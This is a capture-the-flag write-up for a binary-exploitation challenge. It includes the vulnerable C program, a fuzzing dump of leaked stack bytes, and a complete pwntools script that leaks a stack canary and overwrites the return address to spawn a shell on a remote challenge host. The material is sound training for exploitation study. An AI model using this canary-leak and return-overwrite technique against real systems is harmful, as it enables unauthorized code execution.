# Write-up of the challenge "Ssp_001"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The objective of this challenge is to leak the **canary** and overwrite the **RIP** to make it point to **get_shell**.

## Program structure

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```

## Security breach

The two vulnerabilties here are:

1. **read(0, name, name_len);**, this can lead to **buffer overflow** if the user specfies name_len that's bigger than the **name buffer**.

2. **print_box(box, idx);**, let's the user specify which index to access without any restrictions that's bad because we can use it to find the **canary**.

## Solution

So I started by doing some fuzzing on option **F** to try to find the canary using this functions:

```
def fuzz_canary():
    for i in range(300):
        p.sendlineafter("> ", 'P')
        p.sendlineafter("Element index : ", str(i))
        p.recvuntil("is : ")
        recived = p.recvline()

        print(f"Recived {i}", recived)
```

and it returned:

```
Recived 0 b'00\n'
Recived 1 b'00\n'
Recived 2 b'00\n'
Recived 3 b'00\n'
Recived 4 b'00\n'
Recived 5 b'00\n'
Recived 6 b'00\n'
Recived 7 b'00\n'
Recived 8 b'00\n'
Recived 9 b'00\n'
Recived 10 b'00\n'
Recived 11 b'00\n'
Recived 12 b'00\n'
Recived 13 b'00\n'
Recived 14 b'00\n'
Recived 15 b'00\n'
Recived 16 b'00\n'
Recived 17 b'00\n'
Recived 18 b'00\n'
Recived 19 b'00\n'
Recived 20 b'00\n'
Recived 21 b'00\n'
Recived 22 b'00\n'
Recived 23 b'00\n'
Recived 24 b'00\n'
Recived 25 b'00\n'
Recived 26 b'00\n'
Recived 27 b'00\n'
Recived 28 b'00\n'
Recived 29 b'00\n'
Recived 30 b'00\n'
Recived 31 b'00\n'
Recived 32 b'00\n'
Recived 33 b'00\n'
Recived 34 b'00\n'
Recived 35 b'00\n'
Recived 36 b'00\n'
Recived 37 b'00\n'
Recived 38 b'00\n'
Recived 39 b'00\n'
Recived 40 b'00\n'
Recived 41 b'00\n'
Recived 42 b'00\n'
Recived 43 b'00\n'
Recived 44 b'00\n'
Recived 45 b'00\n'
Recived 46 b'00\n'
Recived 47 b'00\n'
Recived 48 b'00\n'
Recived 49 b'00\n'
Recived 50 b'00\n'
Recived 51 b'00\n'
Recived 52 b'00\n'
Recived 53 b'00\n'
Recived 54 b'00\n'
Recived 55 b'00\n'
Recived 56 b'00\n'
Recived 57 b'00\n'
Recived 58 b'00\n'
Recived 59 b'00\n'
Recived 60 b'00\n'
Recived 61 b'00\n'
Recived 62 b'00\n'
Recived 63 b'00\n'
Recived 64 b'00\n'
Recived 65 b'00\n'
Recived 66 b'00\n'
Recived 67 b'00\n'
Recived 68 b'00\n'
Recived 69 b'00\n'
Recived 70 b'00\n'
Recived 71 b'00\n'
Recived 72 b'00\n'
Recived 73 b'00\n'
Recived 74 b'00\n'
Recived 75 b'00\n'
Recived 76 b'00\n'
Recived 77 b'00\n'
Recived 78 b'00\n'
Recived 79 b'00\n'
Recived 80 b'00\n'
Recived 81 b'00\n'
Recived 82 b'00\n'
Recived 83 b'00\n'
Recived 84 b'00\n'
Recived 85 b'00\n'
Recived 86 b'00\n'
Recived 87 b'00\n'
Recived 88 b'00\n'
Recived 89 b'00\n'
Recived 90 b'00\n'
Recived 91 b'00\n'
Recived 92 b'00\n'
Recived 93 b'00\n'
Recived 94 b'00\n'
Recived 95 b'00\n'
Recived 96 b'00\n'
Recived 97 b'00\n'
Recived 98 b'00\n'
Recived 99 b'00\n'
Recived 100 b'00\n'
Recived 101 b'00\n'
Recived 102 b'00\n'
Recived 103 b'00\n'
Recived 104 b'00\n'
Recived 105 b'00\n'
Recived 106 b'00\n'
Recived 107 b'00\n'
Recived 108 b'00\n'
Recived 109 b'00\n'
Recived 110 b'00\n'
Recived 111 b'00\n'
Recived 112 b'00\n'
Recived 113 b'00\n'
Recived 114 b'00\n'
Recived 115 b'00\n'
Recived 116 b'00\n'
Recived 117 b'00\n'
Recived 118 b'00\n'
Recived 119 b'00\n'
Recived 120 b'00\n'
Recived 121 b'00\n'
Recived 122 b'00\n'
Recived 123 b'00\n'
Recived 124 b'00\n'
Recived 125 b'00\n'
Recived 126 b'00\n'
Recived 127 b'00\n'
Recived 128 b'00\n' -> 1st byte
Recived 129 b'bc\n' -> 2st byte
Recived 130 b'91\n' -> 3st byte
Recived 131 b'a0\n' -> 4st byte
Recived 132 b'60\n'
Recived 133 b'cc\n'
Recived 134 b'f9\n'
Recived 135 b'f7\n'
Recived 136 b'00\n'
```

I ran the **file** command on the binary and found it was **32-bits system**. Since the canary often starts with a **null byte**, we can predict the the canary is at position **128 -> 131**, because all that is before is just nullbytes because we didn't write anything to the program!

What I did after was to write a function that grabs the **canary** and reverses it since the **canary** is little endian and we need to also make it a hex an therefore add **0x** at the beginning and convert it to int!

```
def get_canary():
    global canary
    i = 128
    array = []
    for x in range(4):
        val = i + x
        p.sendlineafter("> ", 'P')
        p.sendlineafter("Element index : ", str(val))
        p.recvuntil("is : ")
        recived = p.recv(2).decode()
        array.append(recived)
    array.reverse()
    canary = "0x" + "".join(array)
```

The **RBP** for the **name buffer (char name[0x40])** is at **0x40**, **(+4 since there is a canary)**.
We also know that the canary is **4 bytes before the RBP** and that means the canary should be at the **offset (0x40 + 4) - 4**.

After that I decompiled using **dogbolt** and found out the **RIP**, which was at **0x4c**:

```
char v5;  // [bp-0x4c]

read(0, &v5, v2);

RIP 0x4c
```

So we are going to send **0x40** as padding and then the **4 bytes canary** and send the remaining padding **(0x4c) - (0x40 + 4) which is 8** to reach the **RIP** and overwrite it to the **get_shell address which is 0x080486b9**. Found it's address through **pwndbg**.

solve.py

```
from pwn import *

offset_RBP = 68  # For name 0x40 + 4

# p = process('./ssp_001')
p = remote('host8.dreamhack.games', 16724)

shell = 0x080486b9

canary = "0x"


def fuzz_canary():
    for i in range(300):
        p.sendlineafter("> ", 'P')
        p.sendlineafter("Element index : ", str(i))
        p.recvuntil("is : ")
        recived = p.recvline()

        print(f"Recived {i}", recived)


def get_canary():
    global canary
    i = 128
    array = []
    for x in range(4):
        val = i + x
        p.sendlineafter("> ", 'P')
        p.sendlineafter("Element index : ", str(val))
        p.recvuntil("is : ")
        recived = p.recv(2).decode()
        array.append(recived)
    array.reverse()
    canary = "0x" + "".join(array)


get_canary()


canary = int(canary, 16)


payload = b'A' * (offset_RBP - 4) + p32(canary)

payload += b'A' * 8 + p32(shell)

p.sendline(b'E')
p.sendlineafter(b'Name Size : ', str(len(payload)).encode())
p.sendlineafter(b'Name : ', payload)

p.interactive()
```
